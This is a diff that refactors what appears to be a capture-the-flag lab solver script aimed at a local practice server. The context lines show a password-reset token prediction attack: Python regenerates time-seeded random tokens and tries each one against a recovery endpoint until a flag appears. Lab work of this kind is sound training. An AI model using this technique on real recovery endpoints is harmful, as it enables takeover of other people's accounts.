@@ -5,10 +5,10 @@ URL="${1:?usage: $0 http://127.0.0.1:9370}"
 . "$(dirname "$0")/../lib/h5i.sh"
 new_session lab37
 
-"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
+open_lab "$SESSION" "$URL/"
 
 ask() {  # ask EMAIL -> the JSON body
-    send "$SESSION" req_0 --create --set method=POST --set path=/api/recover \
+    send "$SESSION" "$REQ0" --create --set method=POST --set path=/api/recover \
         --set header.Content-Type=application/json --set "json.email=$1" | body
 }
 
@@ -38,7 +38,7 @@ for t in range(base - 2, base + 3):
     print("%08x%08x" % (r.getrandbits(32), r.getrandbits(32)))
 PY
 ); do
-    OUT="$(send "$SESSION" req_0 --create --reset-budget \
+    OUT="$(send "$SESSION" "$REQ0" --create --reset-budget \
         --set path=/api/recover/use --set "query.token=$T" | flag)"
     [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
 done
